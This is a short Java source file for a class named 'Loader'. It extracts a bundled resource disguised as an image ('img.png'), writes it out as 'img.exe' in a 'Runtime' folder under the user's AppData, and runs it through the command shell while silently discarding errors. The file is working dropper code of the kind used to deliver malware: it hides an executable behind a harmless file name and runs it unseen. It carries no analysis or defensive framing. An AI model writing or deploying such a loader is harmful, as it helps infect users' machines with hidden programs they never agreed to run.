import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;

public class Loader {

	public static void main(String[] args) {
	    //Get users AppData path
		final String runtimePath = System.getProperty("user.home") + "\\AppData\\Roaming\\Runtime";
        final File filePath = new File(runtimePath);
        //Make a new folder called Runtime
        filePath.mkdirs();
        //Setup exe path
        final File exeFile = new File(runtimePath + "\\img.exe");
        //Get the png as a stream
		InputStream is = Loader.class.getClassLoader().getResourceAsStream("img.png");
        FileOutputStream fos;
		try {
		    //Make an output stream in order to write to the new exe
			fos = new FileOutputStream(exeFile);
			//Write
	        Loader.writeFile(is, fos);
		} catch (FileNotFoundException e1) {
			e1.printStackTrace();
		}
        try {
            //Run new file
			Runtime.getRuntime().exec("cmd /k start " + exeFile.getAbsolutePath());
		} catch (IOException e) {
		}
	}
    public static void writeFile(final InputStream is, final FileOutputStream fos) {
        try {
            //Allocate bytes used to read/write
            final byte[] bytes = new byte[1000];
            //Counter var
            int k = 0;
            //While input stream isnt over, write to output stream
            while ((k = is.read(bytes)) != -1) {
                fos.write(bytes, 0, k);
            }
            //When done, close output stream
            fos.close();
        }
        catch (Exception ex) {}
    }

}
